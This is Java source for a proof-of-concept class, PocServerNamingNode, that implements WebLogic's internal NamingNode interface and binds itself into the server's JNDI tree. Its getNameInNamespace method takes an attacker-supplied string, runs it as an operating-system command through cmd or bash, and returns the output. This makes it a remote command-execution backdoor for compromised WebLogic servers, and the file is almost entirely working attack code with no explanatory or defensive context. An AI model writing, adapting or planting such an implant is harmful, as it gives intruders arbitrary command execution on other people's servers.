import weblogic.jndi.internal.NamingNode;
import javax.naming.*;
import javax.naming.event.NamingListener;
import java.io.*;
import java.rmi.RemoteException;
import java.util.Hashtable;
import java.util.List;

/**
 * Title: PocServerNamingNode
 * Desc: PocServer for NamingNode
 * Date:2020/4/3 21:22
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class PocServerNamingNode implements NamingNode {

    /**
     * rmi bind
     * @param clientName bind 名称
     * @throws RemoteException
     */
    public void rmiBind(String clientName) {
        try {
            PocServerNamingNode rmiServer = new PocServerNamingNode();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void bind(String s, Object o, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public Context createSubcontext(String s, Hashtable hashtable) throws NamingException, RemoteException {
        return null;
    }

    @Override
    public void destroySubcontext(String s, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public NameParser getNameParser(String s, Hashtable hashtable) throws NamingException, RemoteException {
        return null;
    }

    @Override
    public String getNameInNamespace() throws RemoteException {
        return null;
    }

    @Override
    public String getNameInNamespace(String cmd) throws NamingException, RemoteException {
        String[] splitArr = cmd.split("@@");
        cmd = splitArr[0];
        String charsetName = splitArr[1];
        charsetName = charsetName.trim().toUpperCase();
        return execCmd(cmd, charsetName);
    }

    @Override
    public NamingEnumeration list(String s, Hashtable hashtable) throws NamingException, RemoteException {
        return null;
    }

    @Override
    public NamingEnumeration listBindings(String s, Hashtable hashtable) throws NamingException, RemoteException {
        return null;
    }

    @Override
    public Object lookup(String s, Hashtable hashtable) throws NamingException, RemoteException {
        return null;
    }

    @Override
    public Object lookupLink(String s, Hashtable hashtable) throws NamingException, RemoteException {
        return null;
    }

    @Override
    public void rebind(String s, Object o, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public void rebind(Name name, Object o, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public void rebind(String s, Object o, Object o1, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public void rename(String s, String s1, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public void unbind(String s, Object o, Hashtable hashtable) throws NamingException, RemoteException {

    }

    @Override
    public NamingNode getParent() {
        return null;
    }

    @Override
    public Context getContext(Hashtable hashtable) {
        return null;
    }

    @Override
    public void addNamingListener(String s, int i, NamingListener namingListener, Hashtable hashtable) throws NamingException {

    }

    @Override
    public void removeNamingListener(NamingListener namingListener, Hashtable hashtable) throws NamingException {

    }

    @Override
    public List getOneLevelScopeNamingListeners() {
        return null;
    }

    @Override
    public void addOneLevelScopeNamingListener(NamingListener namingListener) {

    }

    /**
     * 执行命令
     * @param cmd 执行命令
     * @param charsetName 编码
     * @return 执行结果
     * @throws RemoteException
     */
    public String execCmd(String cmd, String charsetName){
        if(cmd == null || "".equals(cmd)){
            return "commond not null";
        }
        if("".equals(charsetName) || charsetName ==null){
            charsetName = "UTF-8";
        }
        charsetName = charsetName.trim();
        if(charsetName.toUpperCase().equals("UTF-8")){
            charsetName = "UTF-8";
        }else if(charsetName.toUpperCase().equals("GBK")){
            charsetName = "GBK";
        }else{
            charsetName = "UTF-8";
        }
        cmd = cmd.trim();
        StringBuilder result = new StringBuilder();
        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;
        String os = System.getProperty("os.name");
        os = os.toLowerCase();
        String[] executeCmd = null;
        if(os.contains("win")){
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -n 4";
            }
            executeCmd = new String[]{"cmd", "/c", cmd};
        }else{
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -t 4";
            }
            executeCmd = new String[]{"/bin/bash", "-c", cmd};
        }
        try {
            process = Runtime.getRuntime().exec(executeCmd);
            process.waitFor();
            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), charsetName));
            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), charsetName));
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }
        } catch (InterruptedException e) {
        } catch (UnsupportedEncodingException e) {
        } catch (IOException e) {
            return cmd+" execute error,msg: not found commond";
        } finally {
            closeStream(bufrIn);
            closeStream(bufrError);
            if (process != null) {
                process.destroy();
            }
        }
        if(result == null || "".equals(result)){
            return cmd+" execute ok!";
        }else{
            return result.toString();
        }
    }

    private void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // TODO:
            }
        }
    }
}
